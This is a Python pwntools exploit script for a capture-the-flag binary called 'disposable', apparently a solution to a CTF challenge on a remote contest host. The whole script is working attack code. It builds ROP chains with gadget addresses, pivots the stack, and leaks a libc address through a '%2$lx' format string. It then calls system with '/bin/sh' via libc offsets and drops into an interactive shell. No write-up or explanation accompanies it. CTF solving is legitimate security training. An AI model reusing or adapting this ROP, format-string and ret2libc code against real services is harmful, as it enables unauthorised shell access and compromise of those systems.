#!/usr/bin/python

from pwn import *
import json

def register(i,p):
  s.sendline("2")
  s.recvuntil(": ")
  s.sendline(i)
  s.recvuntil(": ")
  s.sendline(p)
  s.recvuntil("> ")

def login(i,p):
  s.sendline("1")
  s.recvuntil(": ")
  s.sendline(i)
  s.recvuntil(": ")
  s.sendline(p)
  s.recvuntil("> ")

def view_msg():
  s.sendline("2")
  return s.recvuntil("> ")

if __name__ == "__main__":
  debug=1
  if debug:
    s = process("./disposable")
  else:
    s = remote("disposable.eatpwnnosleep.com",30020)
    s.recvuntil("--------------------------------------\n")
    a={
      'apikey':"blinded"
    }
    s.send(json.dumps(a).encode())
  rsi_r15 = 0x00000000004012f1 #: pop rsi ; pop r15 ; ret
  rdi = 0x00000000004012f3
  rsp = 0x00000000004012ed #: pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
  pay = p64(rsi_r15)+p64(0x616e40)+p64(0)+p64(rdi)+p64(0x4013cf)+p64(0x400780)+p64(rsp)+"\x28\x6e\x61"
  print len(pay)
  register("1",pay)
  login("1",pay)
  for i in range(7):
    view_msg()

  s.sendline("1")
  s.sendline("444")

  padding = "A"*(0x98-0x74)
  padding += p64(0x00000000004012f1)
  padding += "\x00"*(0x98-len(padding))
  s.sendline(padding+p32(4))
  #pause()
  #s.sendline("1")
  #s.sendline("1")
  pause()
  s.sendline("4")
  s.recvuntil("> ")
  pay = p64(rdi)+p64(0x616e98)+p64(0x400710)+p64(rsi_r15)+p64(0x616f40)+p64(0)+p64(rdi)+p64(0x4013cf)+p64(0x400780)+p64(rsp)+p64(0x616f28)+"%2$lx"
  #pay = p64(
  s.sendline(pay)

  libc = int(s.recvn(12),16)
  libc -= 0x3c6790
  s.info("LIBC: "+hex(libc))

  pay = p64(rdi)+p64(libc+0x18cd57)+p64(libc+0x45390)
  s.sendline(pay)
  s.interactive()
